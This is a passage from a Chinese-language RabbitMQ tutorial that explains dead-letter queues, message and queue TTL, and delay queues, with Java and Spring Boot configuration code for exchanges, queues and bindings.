class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer01</span> &#123;<br>    <span class="hljs-comment">//普通交换机名称</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_exchange&quot;</span>;<br>    <span class="hljs-comment">//死信交换机名称</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dead_exchange&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        <span class="hljs-comment">//声明死信和普通交换机 类型为 direct</span><br>        channel.exchangeDeclare(NORMAL_EXCHANGE, BuiltinExchangeType.DIRECT);<br>        channel.exchangeDeclare(DEAD_EXCHANGE, BuiltinExchangeType.DIRECT);<br>        <span class="hljs-comment">//声明死信队列</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">deadQueue</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dead-queue&quot;</span>;<br>        channel.queueDeclare(deadQueue, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//死信队列绑定死信交换机与 routingkey</span><br>        channel.queueBind(deadQueue, DEAD_EXCHANGE, <span class="hljs-string">&quot;lisi&quot;</span>);<br>        <span class="hljs-comment">//正常队列绑定死信队列信息</span><br>        Map&lt;String, Object&gt; params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//正常队列设置死信交换机 参数 key 是固定值</span><br>        params.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>, DEAD_EXCHANGE);<br>        <span class="hljs-comment">//正常队列设置死信 routing-key 参数 key 是固定值</span><br>        params.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>, <span class="hljs-string">&quot;lisi&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">normalQueue</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal-queue&quot;</span>;<br>        channel.queueDeclare(normalQueue, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, params);<br>        channel.queueBind(normalQueue, NORMAL_EXCHANGE, <span class="hljs-string">&quot;zhangsan&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;等待接收消息.....&quot;</span>);<br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag, delivery) -&gt; &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(delivery.getBody(), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            <span class="hljs-keyword">if</span> (message.equals(<span class="hljs-string">&quot;info5&quot;</span>)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;Consumer01 接收到消息&quot;</span> + message + <span class="hljs-string">&quot;并拒绝签收该消息&quot;</span>);<br>                <span class="hljs-comment">//requeue 设置为 false 代表拒绝重新入队 该队列如果配置了死信交换机将发送到死信队列中</span><br>                channel.basicReject(delivery.getEnvelope().getDeliveryTag(), <span class="hljs-literal">false</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;Consumer01 接收到消息&quot;</span> + message);<br>                channel.basicAck(delivery.getEnvelope().getDeliveryTag(), <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">autoAck</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        channel.basicConsume(normalQueue, autoAck, deliverCallback, consumerTag -&gt; &#123;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>消费者02代码无改变</p></li></ul></li><li><p>效果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112212031901.png" alt="image-20230112212031901" /></p><p>​</p></li></ol><p>​<strong>启动消费者 1 然后再启动消费者 2</strong></p><p>​<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112212043601.png" alt="image-20230112212043601" /></p><h3 id="rabbitmq中的ttl"><a class="markdownIt-Anchor" href="#rabbitmq中的ttl"></a> RabbitMQ中的TTL</h3><p>TTL 是什么呢？TTL 是 RabbitMQ 中一个消息或者队列的属性，表明一条消息或者该队列中的所有</p><p>消息的最大存活时间，单位是毫秒。换句话说，如果一条消息设置了 TTL 属性或者进入了设置 TTL 属性的队列，那么这条消息如果在 TTL 设置的时间内没有被消费，则会成为&quot;死信&quot;。如果同时配置了队列的 TTL 和消息的TTL，那么较小的那个值将会被使用，有两种方式设置 TTL。</p><p><strong>消息设置 TTL</strong></p><p>另一种方式便是针对每条消息设置 TTL</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112212803386.png" alt="image-20230112212803386" /></p><p><strong>队列设置 TTL</strong></p><p>第一种是在创建队列的时候设置队列的“x-message-ttl”属性</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112212816171.png" alt="image-20230112212816171" /></p><p><strong>两者的区别</strong></p><p>如果设置了队列的 TTL 属性，那么一旦消息过期，就会被队列丢弃(如果配置了死信队列被丢到死信队列中)，而第二种方式，消息即使过期，也不一定会被马上丢弃，因为<strong>消息是否过期是在即将投递到消费者****之前判定的</strong>，如果当前队列有严重的消息积压情况，则已过期的消息也许还能存活较长时间；另外，还需要注意的一点是，如果不设置 TTL，表示消息永远不会过期，如果将 TTL 设置为 0，则表示除非此时可以直接投递该消息到消费者，否则该消息将会被丢弃。</p><h1 id="8-延迟队列"><a class="markdownIt-Anchor" href="#8-延迟队列"></a> 8. 延迟队列</h1><blockquote><p>概念</p></blockquote><p>延时队列,队列内部是有序的，最重要的特性就体现在它的延时属性上，延时队列中的元素是希望在指定时间到了以后或之前取出和处理，简单来说，延时队列就是用来存放需要在指定时间被处理的元素的队列。</p><blockquote><p>使用场景</p></blockquote><ol><li>订单在十分钟之内未支付则自动取消</li><li>新创建的店铺，如果在十天内都没有上传过商品，则自动发送消息提醒。</li><li>用户注册成功后，如果三天内没有登陆则进行短信提醒。</li><li>用户发起退款，如果三天内没有得到处理则通知相关运营人员。</li><li>预定会议后，需要在预定的时间点前十分钟通知各个与会人员参加会议</li></ol><p>这些场景都有一个特点，需要在某个事件发生之后或者之前的指定时间点完成某一项任务，如:发生订单生成事件，在十分钟之后检查该订单支付状态，然后将未支付的订单进行关闭;看起来似乎使用定时任务，一直轮询数据，每秒查一次，取出需要被处理的数据，然后处理不就完事了吗?如果数据量比较少，确实可以这样做，比如:对于“如果账单一周内未支付则进行自动结算”这样的需求,如果对于时间不是严格限制，而是宽松意义上的一周，那么每天晚上跑个定时任务检查一下所有未支付的账单，确实也是一个可行的方案。但对于数据量比较大，并且时效性较强的场景，如:“订单十分钟内未支付则关闭“，短期内未支付的订单数据可能会有很多，活动期间甚至会达到百万甚至千万级别，对这么庞大的数据量仍旧使用轮询的方式显然是不可取的，很可能在一秒内无法完成所有订单的检查，同时会给数据库带来很大压力，无法满足业务要求而且性能低下。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112212405491.png" alt="image-20230112212405491" /></p><p>前面我们介绍了死信队列，刚刚又介绍了 TTL，至此利用 RabbitMQ 实现延时队列的两大要素已经集齐，接下来只需要将它们进行融合，再加入一点点调味料，延时队列就可以新鲜出炉了。想想看，延时队列，不就是想要消息延迟多久被处理吗，TTL 则刚好能让消息在延迟多久之后成为死信，另一方面，成为死信的消息都会被投递到死信队列里，这样只需要消费者一直消费死信队列里的消息就完事了，因为里面的消息都是希望被立即处理的消息。</p><h2 id="81-整合springboot"><a class="markdownIt-Anchor" href="#81-整合springboot"></a> 8.1 整合Springboot</h2><ol><li><p>XML</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.73<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.amqp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-rabbit-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.rabbitmq.host</span>=<span class="hljs-string">192.168.23.132</span><br><span class="hljs-attr">spring.rabbitmq.port</span>=<span class="hljs-string">5672</span><br><span class="hljs-attr">spring.rabbitmq.username</span>=<span class="hljs-string">admin</span><br><span class="hljs-attr">spring.rabbitmq.password</span>=<span class="hljs-string">admin</span><br></code></pre></td></tr></table></figure></li><li><p>添加Swagger配置类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> springfox.documentation.builders.ApiInfoBuilder;<br><span class="hljs-keyword">import</span> springfox.documentation.service.ApiInfo;<br><span class="hljs-keyword">import</span> springfox.documentation.service.Contact;<br><span class="hljs-keyword">import</span> springfox.documentation.spi.DocumentationType;<br><span class="hljs-keyword">import</span> springfox.documentation.spring.web.plugins.Docket;<br><span class="hljs-keyword">import</span> springfox.documentation.swagger2.annotations.EnableSwagger2;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 添加Swagger配置类</span><br><span class="hljs-comment"> * [io.xtwoy.config]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/12 21:47]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableSwagger2</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SwaggerConfig</span> &#123;<br> <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Docket <span class="hljs-title function_">webApiConfig</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Docket</span>(DocumentationType.SWAGGER_2)<br>                .groupName(<span class="hljs-string">&quot;webApi&quot;</span>)<br>                .apiInfo(webApiInfo())<br>                .select()<br>                .build();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> ApiInfo <span class="hljs-title function_">webApiInfo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApiInfoBuilder</span>()<br>                .title(<span class="hljs-string">&quot;rabbitmq接口文档&quot;</span>)<br>                .description(<span class="hljs-string">&quot;本文档描述了rabbitmq微服务接口定义&quot;</span>)<br>                .version(<span class="hljs-string">&quot;1.0&quot;</span>)<br>                .contact(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Contact</span>(<span class="hljs-string">&quot;enjoy6288&quot;</span>,<span class="hljs-string">&quot;http://atguigu.com&quot;</span>,<span class="hljs-string">&quot;123456@qq.com&quot;</span>))<br>                .build();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h2 id="82-队列实现"><a class="markdownIt-Anchor" href="#82-队列实现"></a> 8.2 队列实现</h2><blockquote><p>代码架构</p></blockquote><p>创建两个队列QA和QB，两者队列TTL分别设置为10S和40S，然后在创建一个交换机X和死信交换机Y，它们的类型都是direct，创建一个死信队列QD，它们的绑定关系如下：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112215005305.png" alt="image-20230112215005305" /></p><blockquote><p>代码实现</p></blockquote><ol><li><p>配置类代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.config;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.core.*;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.config]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/12 21:51]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TtlQueueConfig</span> &#123;<br><br><br>    <span class="hljs-comment">//普通交换机的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span>  <span class="hljs-variable">X_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;X&quot;</span>;<br>    <span class="hljs-comment">//死信交换机的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">Y_DEAD_LETTER_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Y&quot;</span>;<br>    <span class="hljs-comment">//普通队列的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_A</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QA&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_B</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QB&quot;</span>;<br>    <span class="hljs-comment">//死信队列的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_LATTER_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QD&quot;</span>;<br><br>    <span class="hljs-comment">//声明xExchange</span><br>    <span class="hljs-meta">@Bean(&quot;xExchange&quot;)</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">xExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(X_EXCHANGE);<br>    &#125;<br><br>    <span class="hljs-comment">//声明yExchange</span><br>    <span class="hljs-meta">@Bean(&quot;yExchange&quot;)</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">yExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(Y_DEAD_LETTER_EXCHANGE);<br>    &#125;<br><br>    <span class="hljs-comment">//声明队列</span><br>    <span class="hljs-meta">@Bean(&quot;queueA&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueA</span><span class="hljs-params">()</span>&#123;<br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//设置死信交换机</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,Y_DEAD_LETTER_EXCHANGE);<br>        <span class="hljs-comment">//设置死信Routing-key</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;YD&quot;</span>);<br>        <span class="hljs-comment">//设置TTL 单位是ms</span><br>        arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">10000</span>);<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(QUEUE_A).withArguments(arguments).build();<br>    &#125;<br><br>    <span class="hljs-comment">//声明普通队列 TTL为40s</span><br>    <span class="hljs-meta">@Bean(&quot;queueB&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueB</span><span class="hljs-params">()</span>&#123;<br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//设置死信交换机</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,Y_DEAD_LETTER_EXCHANGE);<br>        <span class="hljs-comment">//设置死信Routing-key</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;YD&quot;</span>);<br>        <span class="hljs-comment">//设置TTL 单位是ms</span><br>        arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">40000</span>);<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(QUEUE_B).withArguments(arguments).build();<br>    &#125;<br><br>    <span class="hljs-comment">//死信队列</span><br>    <span class="hljs-meta">@Bean(&quot;queueD&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueD</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(DEAD_LATTER_QUEUE).build();<br>    &#125;<br><br>    <span class="hljs-comment">//绑定</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueABindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueA&quot;)</span> Queue queueA,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;xExchange&quot;)</span> DirectExchange xExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueA).to(xExchange).with(<span class="hljs-string">&quot;XA&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//绑定</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueBBindingX</span><span class="hljs-params">(<span 